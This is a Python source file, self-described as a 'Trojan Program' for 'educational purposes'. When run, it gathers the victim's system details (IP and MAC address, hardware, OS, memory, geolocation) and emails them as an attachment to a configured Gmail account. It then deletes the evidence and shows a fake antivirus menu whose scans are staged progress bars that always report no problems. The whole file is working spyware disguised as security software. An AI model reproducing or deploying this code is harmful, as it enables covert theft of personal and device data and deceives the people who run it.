"""
Author: @new92
Trojan Program
Made for educational purposes
The author has no responsibility for any illegal activity/activities carried out using this program
          d8888                   888      d8b
         d88888                   888      Y8P
        d88P888                   888
       d88P 888 88888b.  888  888 88888b.  888 .d8888b
      d88P  888 888 "88b 888  888 888 "88b 888 88K
     d88P   888 888  888 888  888 888  888 888 "Y8888b.
    d8888888888 888  888 Y88b 888 888 d88P 888      X88
   d88P     888 888  888  "Y88888 88888P"  888  88888P'
"""

#Imports
try:
    import sys
    import os
    import socket
    import nmap
    import locale 
    import platform
    import time
    import random
    import pyfiglet
    import geocoder
    import requests
    import http
    import scapy
    import subprocess
    import webbrowser
    import smtplib
    import json 
    import getpass
    import cryptography
    import crypto
    import sniffer
    import gmail
    import psutil
    import datetime
    import wmi
    import logging
    import re
    import uuid
    import device_detector
    from os import system
    from device_detector import DeviceDetector
    from device_detector import SoftwareDetector
    from geopy.geocoders import Nominatim
except ImportError as imp:
    print("[!] WARNING: Not all modules used in this program have been installed !")
    time.sleep(2)
    print("[+] Ignoring Warning...")
    time.sleep(1)
    if platform.system == "Windows":
        system("pip3 install -r requirements.txt")
    else:
        system("sudo pip3 install -r requirements.txt")
#End of Imports

#Main program
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor
loc=Nominatim(user_agent="Getloc")
getLoc=loc.geocode("Location") 
location=getLoc.latitude,getLoc.longitude
hostname=socket.gethostname()
DevIP=socket.gethostbyname(hostname)
IPport=socket.IPPORT_RESERVED
OSname=os.name
language=locale.getdefaultlocale()
SysFileEnc=sys.getfilesystemencoding()
ApiVers=sys.api_version
plat = platform.uname()
System = plat.system
Name = plat.node
Vers = plat.version
Machine = plat.machine
Processor = plat.processor
PCores = psutil.cpu_count(logical=False)
LCores = psutil.cpu_count(logical=True)
vrmem = psutil.virtual_memory()
MemTots = get_size(vrmem.total)
MemAv = get_size(vrmem.available)
MemUsed = get_size(vrmem.used)
var = wmi.WMI()
CCPUF = psutil.cpu_freq().current
MINCPUF = psutil.cpu_freq().min
MAXCPUF = psutil.cpu_freq().max
VSys = var.Win32_ComputerSystem()[0]
MFact = VSys.Manufacturer
Model = VSys.Model
SysType = VSys.SystemType
MacAddr = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
RAM = str(round(psutil.virtual_memory().total / (1024.0 **3)))
AVRAM = round(psutil.virtual_memory().available/1000000000, 2)
URAM = round(psutil.virtual_memory().used/1000000000, 2)
Data="Location: ",location,"Device IP: ",DevIP,"IP Port: ",IPport,"OS Name: ",OSname,"Language: ",language,"System File Encoding: ",SysFileEnc,"Api Version: ",ApiVers,"OS: ",System,"Device Name: ",Name,"Device Version: ",Vers,"Machine: ",Machine,"Processor: ",Processor,"Logical Cores: ",LCores,"Physical Cores: ",PCores,"Total Memory: ",MemTots,"Memory Available: ",MemAv,"Memory Used: ",MemUsed,"Manufacturer: ",MFact,"Model: ",Model,"System Type: ",SysType,"MAC Address: ",MacAddr,"RAM: ",RAM,"Current CPU Frequency: ",CCPUF,"Minimum CPU Frequency: ",MINCPUF,"Max CPU Frequency: ",MAXCPUF,"Available RAM: ",AVRAM,"GB","Used RAM: ",URAM,"GB"
f = open("AllData.txt","a")
f.write(str(Data)+"\n")
f.close()
gmail1 = gmail.GMail("enteryouremailhere@gmail.com","enteryourpasswordhere")
message = gmail.Message("Data",to="enteryouremailhere@gmail.com",attachments=["AllData.txt"])
gmail1.send(message)
time.sleep(2)
os.remove("AllData.txt")
num=random.randint(1,24)
antivirus=pyfiglet.figlet_format("ANTIVIRUS")
print(antivirus)
time.sleep(2)
print("[1] : Quick System Scan")
time.sleep(1)
print("[2] : Full System Scan")
time.sleep(1)
print("[3] : Quarantine")
time.sleep(1)
print("[4] : Scan for vulnerabilities")
time.sleep(1)
print("[5] : Database Update")
time.sleep(1)
action=int(input("[+] Please enter the action you want to make: "))
while action < 1 or action > 5:
    print("[!] Invalid Action !")
    time.sleep(2)
    action=int(input("[+] Please enter again: "))
if action == 1:
    print("[+] Initiating Quick System Scan...")
    time.sleep(2)
    print("[----------] 0%")
    time.sleep(4)
    print("[==--------] 20%")
    time.sleep(4)
    print("[====------] 40%")
    time.sleep(4)
    print("[======----] 60%")
    time.sleep(4)
    print("[========--] 80%")
    time.sleep(4)
    print("[==========] 100%")
    time.sleep(2)
    print("[+] Scan successful ! Everything seems to be perfect :)")
elif action == 2:
    print("[+] Initiating Full System Scan...")
    time.slep(2)
    print("[+] This process may last long time")
    time.sleep(1)
    print("[+] Please do not shutdown your device")
    time.sleep(3)
    print("[----------] 0%")
    time.sleep(20)
    print("[=---------] 10%")
    time.sleep(20)
    print("[==--------] 20%")
    time.sleep(20)
    print("[===-------] 30%")
    time.sleep(20)
    print("[====------] 40%")
    time.sleep(20)
    print("[=====-----] 50%")
    time.sleep(20)
    print("[======----] 60%")
    time.sleep(20)
    print("[=======---] 70%")
    time.sleep(20)
    print("[========--] 80%")
    time.sleep(20)
    print("[=========-] 90%")
    time.sleep(20)
    print("[==========] 100%")
    time.sleep(2)
    print("[!] Scan successful ! Everything seems to be perfect :)")
elif action == 3:
    print("[+] Good ! 0 Files have been putted in quarantine !")
elif action == 4:
    print("[+] Initiating Scan for Vulnerabilities...")
    time.sleep(2)
    print("[+] Please do not shutdown your device !")
    time.sleep(2)
    print("[----------] 0%")
    time.sleep(4)
    print("[==--------] 20%")
    time.sleep(4)
    print("[====------] 40%")
    time.sleep(4)
    print("[======----] 60%")
    time.sleep(4)
    print("[========--] 80%")
    time.sleep(5)
    print("[==========] 100%")
    time.sleep(2)
    print("[!] Scan successful ! No vulnerabilities found :)")
elif action == 5:
    print("[+] No database update needed")
    time.sleep(2)
    print("[+] The program updated them "+str(num)+" hours ago")
#End of the program
